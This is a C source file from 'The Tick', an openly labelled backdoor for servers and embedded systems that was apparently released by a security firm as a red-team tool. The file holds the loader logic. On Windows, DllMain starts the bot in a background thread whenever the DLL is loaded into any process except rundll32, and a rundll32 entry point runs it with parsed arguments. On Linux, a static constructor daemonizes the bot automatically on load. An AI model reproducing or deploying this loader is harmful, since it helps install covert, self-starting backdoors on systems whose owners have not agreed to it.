/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "libmain.h"

#include "command.h"
#include "config.h"

#ifdef _WIN32

DWORD WINAPI _stub_run(LPVOID lpParam);

// Windows version. Here we have a standard way of being called when we're loaded.
// However the state of the process may be quite unstable, depending on how
// the DLL was loaded. To be on the safe side, we create a background thread.
// The thread will be automatically locked until DLL initialization is complete.
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved __attribute__((unused)))
{
    // Only try to run the bot on DLL load, ignore all other events.
    if (fdwReason == DLL_PROCESS_ATTACH) {

        // Disable thread creation events, since it may cause a deadlock.
        DisableThreadLibraryCalls(hinstDLL);

        // Check if we're running inside rundll32.exe.
        char pathname[MAX_PATH];
        memset(pathname, 0, sizeof(pathname));
        GetModuleFileNameA(NULL, pathname, sizeof(pathname));
        char *filename = PathFindFileNameA(pathname);
        if (filename == NULL || filename[0] == 0 || stricmp(filename, "rundll32.exe") != 0) {

            // For any process other than rundll32.exe, run the bot in a background thread.
            // Do not wait for the thread to be initialized and just close the handle
            // immediately, otherwise we might deadlock since we're still being loaded.
            CloseHandle( CreateThread(NULL, 0, &_stub_run, NULL, 0, NULL) );

        }
    }

    // We must always return TRUE or the DLL load may be aborted.
    return TRUE;
}

// Function stub with the signature CreateThread expects.
DWORD WINAPI _stub_run(LPVOID lpParam __attribute__((unused)))
{
    run(0, NULL);   // note we don't check_for_help() here
    ExitThread(0);
}

// Entrypoint function for use with Rundll32.
#ifdef TICK_FEATURES_RUNDLL
# ifndef TICK_RUNDLL_ENTRY_POINT
#  error Missing definition of TICK_RUNDLL_ENTRY_POINT
# endif
extern __declspec(dllexport) void CALLBACK TICK_RUNDLL_ENTRY_POINT(HWND hwnd __attribute__((unused)), HINSTANCE hinst __attribute__((unused)), LPSTR lpszCmdLine __attribute__((unused)), int nCmdShow __attribute__((unused)))
{
    // The funny thing about Rundll32 is we can pass command line arguments to a DLL.
    // So if we got any and this feature is enabled, let's parse them.
    int done = 0;
#if TICK_CONFIG_USE_ARGV
    if (lpszCmdLine != NULL) {
        int argc = split_command_line(lpszCmdLine, NULL);
        if (argc > 0) {
            argc++;
            char *argv[argc];
            memset(argv, 0, sizeof(argv));
            argv[0] = "rundll32.exe libtick.dll";
            split_command_line(lpszCmdLine, &argv[1]);
#if TICK_VERBOSE
            if (check_for_help(argc, argv) == 0) {
                run(argc, argv);
                done = 1;
            }
#else
            run(argc, argv);
            done = 1;
#endif
        }
    }
#endif
    if (!done) {
#if TICK_CONFIG_USE_ENV && TICK_VERBOSE
        if (check_for_help(0, NULL) == 0) {
            run(0, NULL);
        }
#else
        run(0, NULL);
#endif
    }

    // Clean exit from the process.
    ExitProcess(0);
}
#endif

#else

// This gets called by the ELF loader since it
// registers itself as a static C++ constructor.
static void static_constructor(void)
{
    daemonize(0, NULL);
    return;
}

#endif
